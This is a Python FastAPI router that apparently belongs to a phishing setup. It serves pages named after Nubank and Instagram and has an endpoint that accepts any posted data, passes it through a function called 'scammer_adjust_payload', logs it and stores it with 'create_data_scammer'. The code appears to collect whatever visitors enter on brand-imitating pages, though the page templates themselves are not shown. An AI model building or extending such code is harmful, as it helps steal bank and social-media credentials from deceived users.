import json
import os

from fastapi import APIRouter, Depends
from fastapi.requests import Request
from fastapi.templating import Jinja2Templates

from app.schemas.member_tools_schema import InfoDataSchema
from app.service.service_member_tools import ServiceMemberTools
from app.utils.payload_adjusts import scammer_adjust_payload

router = APIRouter(prefix='/page')

templates_dir = os.path.join(os.path.dirname(__file__), '..', 'templates')
templates = Jinja2Templates(directory=templates_dir)


@router.get('/nubank')
async def nubank(request: Request):
    context = {
        "request": request
    }
    return templates.TemplateResponse('/pages/nubank/nubank.html', context=context)


@router.get('/instagram')
async def instagram(request: Request):
    context = {
        "request": request
    }
    return templates.TemplateResponse('/pages/instagram/instagram.html', context=context)


@router.post('/info_data')
async def info_data(
        request: Request,
        data: dict,
        service: ServiceMemberTools = Depends(ServiceMemberTools)
):
    context = {
        "request": request,
    }
    payload = scammer_adjust_payload(data)
    print(f'requests: {request}')
    print(f'payload: {payload}')
    respose = service.create_data_scammer(payload)

    #return templates.TemplateResponse('nubank.html', context=context)